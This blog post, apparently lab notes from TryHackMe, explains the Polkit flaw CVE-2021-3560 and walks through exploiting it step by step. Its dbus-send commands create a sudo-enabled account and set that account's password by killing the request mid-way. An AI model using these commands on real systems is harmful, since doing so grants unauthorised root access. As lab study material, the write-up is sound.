---
title: 'TryHackMe: Polkit'
date: 2022-02-13 06:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-02-13-tryhackme-polkit.html
author: 100007
---

<h1 id="tryhackme-polkit">TryHackMe: Polkit</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2022-02-13</p>
<h2 id="polkit-cve-2021-3560">Polkit (CVE-2021-3560)</h2>
<h3 id="background">Background</h3>
<p>CVE-2021-3560 impacted the following distros (at the time of its announcement):</p>
<ul>
<li>Red Hat Enterprise Linux 8</li>
<li>Fedora 21 (or later)</li>
<li>Debian Testing (“Bullseye”)</li>
<li>Ubuntu 20.04 LTS (“Focal Fossa”)</li>
</ul>
<p>Ubuntu fixed with with version <code class="language-plaintext highlighter-rouge">0.105-26ubuntu1.1</code> of the <code class="language-plaintext highlighter-rouge">policykit-1</code> package (the last vulnerable version was <code class="language-plaintext highlighter-rouge">0.105-26ubuntu1</code>).</p>
<p>This bug is a combination of a race condition and bad error handling. Basically:</p>
<ul>
<li>Manually request an action that requires superuser access via DBus.</li>
<li>Kill <code class="language-plaintext highlighter-rouge">dbus-daemon</code> <em>after</em> Polkit has received the message but <em>before</em> it responds (there’s the race).</li>
<li>Polkit requests the user ID associated with the message, but since DBus has restarted it can’t reference the original message ID and responds with an error.</li>
<li>Polkit mishandles the error, substituting 0 for the ID of the requesting user (there’s the botched error handling).</li>
<li>Because the requesting user ID now appears to be root, Polkit just goes ahead and takes the action without issuing a challenge.</li>
</ul>
<p>The race condition is obviously kind of tricky, so best to request something that can perhaps provide some persistence, like the creation of a new user account or changing the password on an existing account.</p>
<h3 id="exploitation-process">Exploitation Process</h3>
<p>(0) Construct a message similar to the following:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dbus-send <span class="se">\</span>
<span class="nt">--system</span> <span class="se">\</span>
<span class="nt">--dest</span><span class="o">=</span>org.freedesktop.Accounts <span class="se">\</span>
<span class="nt">--type</span><span class="o">=</span>method_call <span class="se">\</span>
<span class="nt">--print-reply</span> /org/freedesktop/Accounts <span class="se">\</span>
org.freedesktop.Accounts.CreateUser <span class="se">\</span>
string:attacker <span class="se">\</span>
string:<span class="s2">"Pentester Account"</span> <span class="se">\</span>
int32:1
</code></pre></div></div>
<p>The three parameters are:</p>
<ul>
<li><code class="language-plaintext highlighter-rouge">string:attacker</code> — the name of the user to create.</li>
<li><code class="language-plaintext highlighter-rouge">string:"Pentester Account"</code> — the user “description” (GECOS field).</li>
<li><code class="language-plaintext highlighter-rouge">int32:1</code> — grant sudo access to the user.</li>
</ul>
<p>(1) Begin by determining how long the message takes to execute on the target. This can be done with the <code class="language-plaintext highlighter-rouge">time</code> command.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">time </span>dbus-send <span class="se">\</span>
<span class="nt">--system</span> <span class="se">\</span>
<span class="nt">--dest</span><span class="o">=</span>org.freedesktop.Accounts <span class="se">\</span>
<span class="nt">--type</span><span class="o">=</span>method_call <span class="se">\</span>
<span class="nt">--print-reply</span> /org/freedesktop/Accounts <span class="se">\</span>
org.freedesktop.Accounts.CreateUser <span class="se">\</span>
string:attacker <span class="se">\</span>
string:<span class="s2">"Pentester Account"</span> <span class="se">\</span>
int32:1
</code></pre></div></div>
<p>(3) DBus needs to be killed approximately <em>halfway</em> through this execution period. We <em>cannot</em> wait for the application to return, so instead we background it.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dbus-send <span class="se">\</span>
<span class="nt">--system</span> <span class="se">\</span>
<span class="nt">--dest</span><span class="o">=</span>org.freedesktop.Accounts <span class="se">\</span>
<span class="nt">--type</span><span class="o">=</span>method_call <span class="se">\</span>
<span class="nt">--print-reply</span> /org/freedesktop/Accounts <span class="se">\</span>
org.freedesktop.Accounts.CreateUser <span class="se">\</span>
string:attacker <span class="se">\</span>
string:<span class="s2">"Pentester Account"</span> <span class="se">\</span>
int32:1 &amp; <span class="se">\</span>
<span class="nb">sleep</span> <span class="k">$&#x007b;</span><span class="nv">TIME</span><span class="k">&#x007d;</span>s<span class="p">;</span> <span class="nb">kill</span> <span class="nv">$!</span>
</code></pre></div></div>
<p>Here <code class="language-plaintext highlighter-rouge">$TIME</code> is approximately half the time measured in the previous step.</p>
<p>(4) ID the created user.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id </span>attacker
</code></pre></div></div>
<p>(5) Create a new password hash for the user.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-6</span> <span class="nv">$PASSWORD</span>
</code></pre></div></div>
<p>(6) Pull the same trick as in step 3, but with setting the created user’s password.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dbus-send <span class="se">\</span>
<span class="nt">--system</span> <span class="se">\</span>
<span class="nt">--dest</span><span class="o">=</span>org.freedesktop.Accounts <span class="se">\</span>
<span class="nt">--type</span><span class="o">=</span>method_call <span class="se">\</span>
<span class="nt">--print-reply</span> /org/freedesktop/Accounts/User<span class="nv">$UID</span> <span class="se">\</span>
org.freedesktop.Accounts.User.SetPassword <span class="se">\</span>
string:<span class="s1">'$PASSWORD_HASH'</span> <span class="se">\</span>
string:<span class="s1">'Ask the pentester'</span> &amp; <span class="se">\</span>
<span class="nb">sleep</span> <span class="k">$&#x007b;</span><span class="nv">TIME</span><span class="k">&#x007d;</span>s<span class="p">;</span> <span class="nb">kill</span> <span class="nv">$!</span>
</code></pre></div></div>
<p>Here <code class="language-plaintext highlighter-rouge">$UID</code> is the user ID retrieved in step 4 (note that there’s <em>no</em> space between <code class="language-plaintext highlighter-rouge">User</code> and the ID, so you’ll be hitting an endpoint that looks something like <code class="language-plaintext highlighter-rouge">/org/freedesktop/Accounts/User1003</code>), <code class="language-plaintext highlighter-rouge">$PASSWORD_HASH</code> is the hash returned in step 5, and <code class="language-plaintext highlighter-rouge">$TIME</code> is the same timing determined from step 3. The second <code class="language-plaintext highlighter-rouge">string</code> being passed in the user password hint.</p>
<p>(7) Log in as the new user (probably via <code class="language-plaintext highlighter-rouge">su</code>).</p>